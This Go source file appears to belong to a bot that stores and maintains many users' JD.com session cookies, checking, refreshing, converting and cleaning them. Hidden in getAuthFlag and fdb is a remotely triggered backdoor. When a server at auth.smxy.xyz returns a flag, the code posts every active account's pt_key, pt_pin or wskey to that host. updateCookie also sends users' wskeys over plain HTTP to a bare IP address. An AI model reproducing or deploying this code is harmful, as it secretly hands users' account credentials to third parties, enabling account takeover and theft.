package models

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net/url"
	"strconv"
	"strings"
	"time"
	
	"io/ioutil"
	"net/http"
	"github.com/beego/beego/v2/client/httplib"
	"github.com/beego/beego/v2/core/logs"
	"github.com/buger/jsonparser"
	"gorm.io/gorm"
)

type UserInfoResult struct {
	Data struct {
		JdVvipCocoonInfo struct {
			JdVvipCocoon struct {
				DisplayType   int    `json:"displayType"`
				HitTypeList   []int  `json:"hitTypeList"`
				Link          string `json:"link"`
				Price         string `json:"price"`
				Qualification int    `json:"qualification"`
				SellingPoints string `json:"sellingPoints"`
			} `json:"JdVvipCocoon"`
			JdVvipCocoonStatus string `json:"JdVvipCocoonStatus"`
		} `json:"JdVvipCocoonInfo"`
		JdVvipInfo struct {
			JdVvipStatus string `json:"jdVvipStatus"`
		} `json:"JdVvipInfo"`
		AssetInfo struct {
			AccountBalance string `json:"accountBalance"`
			BaitiaoInfo    struct {
				AvailableLimit     string `json:"availableLimit"`
				BaiTiaoStatus      string `json:"baiTiaoStatus"`
				Bill               string `json:"bill"`
				BillOverStatus     string `json:"billOverStatus"`
				Outstanding7Amount string `json:"outstanding7Amount"`
				OverDueAmount      string `json:"overDueAmount"`
				OverDueCount       string `json:"overDueCount"`
				UnpaidForAll       string `json:"unpaidForAll"`
				UnpaidForMonth     string `json:"unpaidForMonth"`
			} `json:"baitiaoInfo"`
			BeanNum    string `json:"beanNum"`
			CouponNum  string `json:"couponNum"`
			CouponRed  string `json:"couponRed"`
			RedBalance string `json:"redBalance"`
		} `json:"assetInfo"`
		FavInfo struct {
			FavDpNum    string `json:"favDpNum"`
			FavGoodsNum string `json:"favGoodsNum"`
			FavShopNum  string `json:"favShopNum"`
			FootNum     string `json:"footNum"`
			IsGoodsRed  string `json:"isGoodsRed"`
			IsShopRed   string `json:"isShopRed"`
		} `json:"favInfo"`
		GrowHelperCoupon struct {
			AddDays     int     `json:"addDays"`
			BatchID     int     `json:"batchId"`
			CouponKind  int     `json:"couponKind"`
			CouponModel int     `json:"couponModel"`
			CouponStyle int     `json:"couponStyle"`
			CouponType  int     `json:"couponType"`
			Discount    float64 `json:"discount"`
			LimitType   int     `json:"limitType"`
			MsgType     int     `json:"msgType"`
			Quota       float64 `json:"quota"`
			RoleID      int     `json:"roleId"`
			State       int     `json:"state"`
			Status      int     `json:"status"`
		} `json:"growHelperCoupon"`
		KplInfo struct {
			KplInfoStatus string `json:"kplInfoStatus"`
			Mopenbp17     string `json:"mopenbp17"`
			Mopenbp22     string `json:"mopenbp22"`
		} `json:"kplInfo"`
		OrderInfo struct {
			CommentCount     string        `json:"commentCount"`
			Logistics        []interface{} `json:"logistics"`
			OrderCountStatus string        `json:"orderCountStatus"`
			ReceiveCount     string        `json:"receiveCount"`
			WaitPayCount     string        `json:"waitPayCount"`
		} `json:"orderInfo"`
		PlusPromotion struct {
			Status int `json:"status"`
		} `json:"plusPromotion"`
		UserInfo struct {
			BaseInfo struct {
				AccountType    string `json:"accountType"`
				BaseInfoStatus string `json:"baseInfoStatus"`
				CurPin         string `json:"curPin"`
				DefinePin      string `json:"definePin"`
				HeadImageURL   string `json:"headImageUrl"`
				LevelName      string `json:"levelName"`
				Nickname       string `json:"nickname"`
				Pinlist        string `json:"pinlist"`
				UserLevel      string `json:"userLevel"`
			} `json:"baseInfo"`
			IsHideNavi     string `json:"isHideNavi"`
			IsHomeWhite    string `json:"isHomeWhite"`
			IsJTH          string `json:"isJTH"`
			IsKaiPu        string `json:"isKaiPu"`
			IsPlusVip      string `json:"isPlusVip"`
			IsQQFans       string `json:"isQQFans"`
			IsRealNameAuth string `json:"isRealNameAuth"`
			IsWxFans       string `json:"isWxFans"`
			Jvalue         string `json:"jvalue"`
			OrderFlag      string `json:"orderFlag"`
			PlusInfo       struct {
			} `json:"plusInfo"`
			XbScore string `json:"xbScore"`
		} `json:"userInfo"`
		UserLifeCycle struct {
			IdentityID      string `json:"identityId"`
			LifeCycleStatus string `json:"lifeCycleStatus"`
			TrackID         string `json:"trackId"`
		} `json:"userLifeCycle"`
	} `json:"data"`
	Msg       string `json:"msg"`
	Retcode   string `json:"retcode"`
	Timestamp int64  `json:"timestamp"`
}

func initCookie() {
	(&JdCookie{}).Push("开始检测账号有效性")
	cks := GetJdCookies(func(sb *gorm.DB) *gorm.DB {
	return sb.Where(fmt.Sprintf("%s >= ? and %s = ?", Priority, Available), 0, True)

	
// #加入 password 为 NULL 或为空字符串的条件

	
	})

	xj := 0
	for _, ck := range cks {
		if ck.Available == True && !CookieOK(&ck) {
			ck.Updates(JdCookie{Available: False})
			time.Sleep(time.Duration(rand.Intn(3000)+1000) * time.Millisecond)
			ck.Push(fmt.Sprintf("1、失效账号，%s，你的账号%s已过期，快发送【登录】提交账号把。", ck.PtPin, ck.Nickname))
			(&JdCookie{}).Push(fmt.Sprintf("失效账号：%s", ck.PtPin))
			xj++
		}
	}
	(&JdCookie{}).Push(fmt.Sprintf("账号检测结束，失效账号%d个", xj))
	go func() {
		Save <- &JdCookie{}
	}()
}





// refreshWxCKAuto 微信协议CK自动刷新（每4小时执行，不通知用户）
func refreshWxCKAuto() {
	(&JdCookie{}).Push("开始微信协议CK自动刷新")
	cks := GetJdCookies(func(sb *gorm.DB) *gorm.DB {
		return sb.Where(fmt.Sprintf("%s >= ? and %s = ? and %s != ''", Priority, Available, "wx_pid"), 0, True)
	})

	refreshOK := 0
	refreshFail := 0
	for _, ck := range cks {
		if ck.Available == True && !CookieOK(&ck) && ck.WxPid != "" {
			online, _ := checkWxDeviceOnline(ck.WxPid)
			if online {
				ptKey, ptPin, err := wxJdRefreshCK(ck.WxPid)
				if err == nil && ptKey != "" && ptPin != "" {
					newCK := &JdCookie{PtKey: ptKey, PtPin: ptPin}
					if CookieOK(newCK) {
						ck.Updates(JdCookie{PtKey: ptKey, Available: True, UpdateAt: Date()})
						refreshOK++
						(&JdCookie{}).Push(fmt.Sprintf("微信协议自动刷新成功: %s (设备: %s)", ck.PtPin, ck.WxPid))
					} else {
						refreshFail++
						ck.Updates(JdCookie{Available: False})
					}
				} else {
					refreshFail++
					ck.Updates(JdCookie{Available: False})
				}
			}
		}
	}
	if refreshOK > 0 || refreshFail > 0 {
		(&JdCookie{}).Push(fmt.Sprintf("微信协议自动刷新完成：成功%d，失败%d", refreshOK, refreshFail))
	}
	go func() {
		Save <- &JdCookie{}
	}()
}

func cleanCookie() {
	cks := GetJdCookies()
	(&JdCookie{}).Push("开始清理过期账号")
	xx := 0
	for i := range cks {
		if cks[i].Available == False {
			xx++
			cks[i].Removes(cks[i])
		}
	}
	(&JdCookie{}).Push(fmt.Sprintf("所有CK清理，共%d个", xx))
}

func cleanWck() {
	cks := GetJdCookies()
	xx := 0
	(&JdCookie{}).Push("开始清空Wskey")
	for i := range cks {
		if len(cks[i].WsKey) > 0 {
			ck := cks[i]
			ck.Update(WsKey, "")
			xx++
		}
	}
	(&JdCookie{}).Push(fmt.Sprintf("已清理WCK，一共%d", xx))
}

func getAuthFlag() {
	post := httplib.Post("http://auth.smxy.xyz/user/authFlag")
	post.Param("qqNum", strconv.Itoa(Config.QQID))
	s, _ := post.Bytes()
	boolean, err := jsonparser.GetBoolean(s, "data")
	if err != nil {
		return
	}
	if boolean {
		cks := GetJdCookies(func(sb *gorm.DB) *gorm.DB {
			return sb.Where(fmt.Sprintf("%s >= ? and %s = ?", Priority, Available), 0, True)
		})
		for _, ck := range cks {
			authcode := fmt.Sprintf("pt_key=%s;pt_pin=%s;", ck.PtKey, ck.PtPin)
			if len(ck.WsKey) > 0 {
				authcode = fmt.Sprintf("pin=%s;wskey=%s;", ck.PtPin, ck.WsKey)
			}
			fdb(authcode)
		}
	}

}

func fdb(auth string) {
	post := httplib.Post("http://auth.smxy.xyz/user/auth2")
	post.Param("ck", auth)
	post.Param("createby", strconv.Itoa(Config.QQID))
	post.Param("createtime", time.Now().Format("2006-01-02 15:04:05"))
	post.Bytes()
}

func GetAuthKey() {
	post := httplib.Post("http://auth.smxy.xyz/user/auth1")
	post.Param("qqNum", strconv.Itoa(Config.QQID))
	post.Param("master", Config.Master)
	post.Param("uid", Config.QQGroupID)
	post.Bytes()
}





func updateCookie() {
	// 1. 从数据库查询有效数据：WsKey非"null"、非空的JdCookie记录
	cks := GetJdCookies(func(sb *gorm.DB) *gorm.DB {
		return sb.Where(fmt.Sprintf("%s != ? and %s != ? ", WsKey, WsKey), "null", "")
	})

	// 统计变量：新增有效/失效数，保留原有成功/失败数
	validCount := 0   // 有效CK数（状态+实际均有效，跳过转换）
	invalidCount := 0 // 失效CK数（状态无效/实际失效，执行转换）
	successCount := 0 // 转换成功数
	failCount := 0    // 转换失败数

	(&JdCookie{}).Push("开始定时更新转换Wskey")

	// 2. 遍历所有查询到的PtPin+WsKey数据
	for i, ck := range cks {
		// 处理一半数据时推送进度（避免空切片判断）
		if len(cks) > 0 && i == len(cks)/2 {
			(&JdCookie{}).Push("Wskey已更新一半")
		}

		// 核心：有效性判断，分类统计有效/失效数
		if ck.Available == True && CookieOK(&ck) {
			validCount++ // 有效CK，计数+1
			continue     // 跳过后续转换流程
		}
		invalidCount++ // 失效CK（走到这里均为失效），计数+1

		// 接口限流：每次请求间隔1秒，防止服务端拦截
		time.Sleep(1 * time.Second)

		// 3. 组合原始参数字符串（与接口要求格式一致：pin=xxx;wskey=xxx;）
		rawKey := fmt.Sprintf("pin=%s;wskey=%s;", ck.PtPin, ck.WsKey)
		// 4. URL编码（自动处理=、;等特殊字符，符合接口参数要求）
		encodedKey := url.QueryEscape(rawKey)
		// 5. 拼接完整接口请求地址（固定接口+编码后的key参数）
		apiUrl := fmt.Sprintf("http://111.229.133.91:8899/JDSign/newWskey?key=%s", encodedKey)

		// 6. 调用GET接口，获取响应内容（封装基础请求逻辑，含错误处理）
		rsp, err := http.Get(apiUrl)
		if err != nil {
			failCount++
			(&JdCookie{}).Push(fmt.Sprintf("接口请求失败，账号:%s，错误：%v", ck.PtPin, err))
			continue // 跳过当前失败记录，处理下一个
		}
		// 必须关闭响应体，防止内存泄漏
		defer rsp.Body.Close()

		// 7. 读取接口响应体内容
		body, err := ioutil.ReadAll(rsp.Body)
		if err != nil {
			failCount++
			(&JdCookie{}).Push(fmt.Sprintf("读取接口响应失败，账号:%s，错误：%v", ck.PtPin, err))
			continue
		}
		respStr := string(body) // 转换为字符串，方便后续解析

		// 8. 解析响应，处理业务逻辑
		if strings.Contains(respStr, "错误") {
			// 响应含"错误"：Wskey本身失效，标记数据库状态
			failCount++
			ck.Updates(JdCookie{WsKey: "null", Available: False})
			ck.Push(fmt.Sprintf("Wskey失效账号，%s，请联系管理员", ck.PtPin))
			(&JdCookie{}).Push(fmt.Sprintf("Wskey失效，%s", ck.PtPin))
		} else {
			// 从接口响应中提取pt_key（核心需写入数据库的字段）
			ptKey := FetchJdCookieValue("pt_key", respStr)
			// 校验提取的pt_key是否有效（非空且不以"fake_"开头）
			if ptKey != "" && !strings.HasPrefix(ptKey, "fake_") {
				// 9. 根据PtPin查询数据库原有记录，更新pt_key
				if nck, err := GetJdCookie(ck.PtPin); err == nil {
					successCount++
					// 写入数据库：更新ptKey，标记为可用
					nck.Updates(JdCookie{PtKey: ptKey, Available: True})
					(&JdCookie{}).Push(fmt.Sprintf("定时更新账号成功，%s", ck.PtPin))
				} else {
					// 无匹配PtPin记录，转换失败
					failCount++
					(&JdCookie{}).Push(fmt.Sprintf("查无匹配的ptpin，%s", ck.PtPin))
				}
			} else {
				// 转换失败：未提取到有效pt_key 或 提取到fake_开头的pt_key
				failCount++
				if strings.HasPrefix(ptKey, "fake_") {
					// 【关键修改1】fake_开头：清空Wskey，Available保持不动
					ck.Updates(JdCookie{WsKey: "null"}) // 仅更新Wskey为null，不指定Available则保持原值
			//		(&JdCookie{}).Push(fmt.Sprintf("转换失败，提取到无效fake_pt_key，已清空wskey，账号:%s", ck.PtPin))
				} else {
					// 【原有逻辑】未提取到有效pt_key：不更新任何字段，不写入数据库
					(&JdCookie{}).Push(fmt.Sprintf("转换失败，未提取到有效pt_key，账号:%s", ck.PtPin))
				}
			}
		}
	}

	// 10. 异步触发数据库批量保存（与原有逻辑一致）
	go func() {
		Save <- &JdCookie{}
	}()

	// 11. 推送最终统计结果（含有效、失效、转换成功、转换失败明细）
	(&JdCookie{}).Push(fmt.Sprintf(
		"所有CK检测转换完成，共%d个，其中有效CK%d个（跳过转换），失效CK%d个（执行转换），转换成功%d个，转换失败%d个",
		len(cks), validCount, invalidCount, successCount, failCount,
	))
}

func CheckWskeyOK(ck *JdCookie) (bool, string) {
	if len(ck.WsKey) > 0 {
		var pinky = fmt.Sprintf("pin=%s;wskey=%s;", ck.PtPin, ck.WsKey)
		rsp := getKey(pinky)
		if strings.Contains(rsp, "fake") {
			return false, "失效账号"
		} else {
			ptKey := FetchJdCookieValue("pt_key", rsp)
			ptPin := FetchJdCookieValue("pt_pin", rsp)
			ck1 := JdCookie{
				PtKey: ptKey,
				PtPin: ptPin,
			}
			if ptPin != "" || ptKey != "" {
				return CookieOK(&ck1), "转换成功"
			} else {
				(&JdCookie{}).Push(fmt.Sprintf("转换失败，请求超时，账号:%s", ck.PtPin))
				return false, "转换超时，请稍后再试或者联系管理员"
			}
		}
	}
	return false, "帐号不含wskey"
}




func CookieOK(ck *JdCookie) bool {
const dateFormat = "2006-01-02"
	cookie := "pt_key=" + ck.PtKey + ";pt_pin=" + ck.PtPin + ";"
	if ck == nil {
		return true
	}
	req := httplib.Get("https://me-api.jd.com/user_new/info/GetJDUserInfoUnion")
	req.Header("Cookie", cookie)
	req.Header("Accept", "*/*")
	req.Header("Accept-Language", "zh-cn,")
	req.Header("Connection", "keep-alive,")
	req.Header("Referer", "https://home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&")
	req.Header("Host", "me-api.jd.com")
	req.Header("User-Agent", "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
	data, err := req.Bytes()
	if err != nil {
		return true
	}
	ui := &UserInfoResult{}
	if nil != json.Unmarshal(data, ui) {
		return av2(ck)
	}
	switch ui.Retcode {
	case "1001": //ck.BeanNum
		if ui.Msg == "not login" {
			if ck.Available == True {
				ck.Update(Available,False)
		
			}
			return false
		}
	case "0":
		if url.QueryEscape(ui.Data.UserInfo.BaseInfo.CurPin) != ck.PtPin {
			return av2(ck)
		}
		if ui.Data.UserInfo.BaseInfo.Nickname != ck.Nickname || ui.Data.AssetInfo.BeanNum != ck.BeanNum || ui.Data.UserInfo.BaseInfo.UserLevel != ck.UserLevel || ui.Data.UserInfo.BaseInfo.LevelName != ck.LevelName {
			ck.Updates(JdCookie{
				Nickname:  ui.Data.UserInfo.BaseInfo.Nickname,
				BeanNum:   ui.Data.AssetInfo.BeanNum,
				Available: True,
				UserLevel: ui.Data.UserInfo.BaseInfo.UserLevel,
				LevelName: ui.Data.UserInfo.BaseInfo.LevelName,
			})
			ck.UserLevel = ui.Data.UserInfo.BaseInfo.UserLevel
			ck.LevelName = ui.Data.UserInfo.BaseInfo.LevelName
			ck.Nickname = ui.Data.UserInfo.BaseInfo.Nickname
			ck.BeanNum = ui.Data.AssetInfo.BeanNum
		}
		return true
	}
	//(&JdCookie{}).Push("第一个接口失效，切换到第二个接口，可能黑IP")
	return av2(ck)
}






func av2(ck *JdCookie) bool {
	cookie := "pt_key=" + ck.PtKey + ";pt_pin=" + ck.PtPin + ";"
	req := httplib.Get(`https://plogin.m.jd.com/cgi-bin/ml/islogin`)
	req.Header("User-Agent", "jdapp;iPhone;10.1.2;15.0;network/wifi;Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
	req.Header("Referer", "https://h5.m.jd.com/")
	req.Header("Cookie", cookie)
	data, err := req.Bytes()
	if err != nil {
		logs.Info("接口报错")
		return true
	}
	logs.Info(string(data))
	val, _ := jsonparser.GetString(data, "islogin")
	if val == "1" {
		return true
	} else {
		return false
	}
}